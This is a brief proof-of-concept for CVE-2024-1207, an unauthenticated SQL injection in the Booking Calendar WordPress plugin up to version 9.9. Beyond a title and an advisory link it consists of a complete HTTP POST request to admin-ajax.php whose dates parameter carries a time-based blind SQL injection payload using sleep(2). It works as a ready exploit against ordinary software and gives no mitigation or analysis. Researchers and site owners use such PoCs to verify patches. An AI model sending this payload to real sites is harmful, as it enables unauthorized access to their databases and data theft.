# Booking Calendar <= 9.9 - Unauthenticated SQL Injection (CVE-2024-1207)

https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/booking/booking-calendar-99-unauthenticated-sql-injection

POC:
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: vulnerablesite.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

action=WPBC_AJX_BOOKING__CREATE&wpbc_ajx_user_id=0&nonce=17920ccd94&wpbc_ajx_locale=en_US&calendar_request_params%5Bresource_id%5D=1&calendar_request_params%5Bformdata%5D=select-one%5Erangetime1%5E09%3A00+-+10%3A00~text%5Ename1%5EA~text%5Esecondname1%5EA~email%5Eemail1%5EA%40A.COM~text%5Ephone1%5E~textarea%5Edetails1%5E&calendar_request_params%5Bbooking_hash%5D=&calendar_request_params%5Bcustom_form%5D=&calendar_request_params%5Baggregate_resource_id_arr%5D=&calendar_request_params%5Bis_emails_send%5D=1&calendar_request_params%5Bactive_locale%5D=en_US&calendar_request_params%5Bdates_ddmmyy_csv%5D=17'))) and sleep(2)-- -.03.2024
```
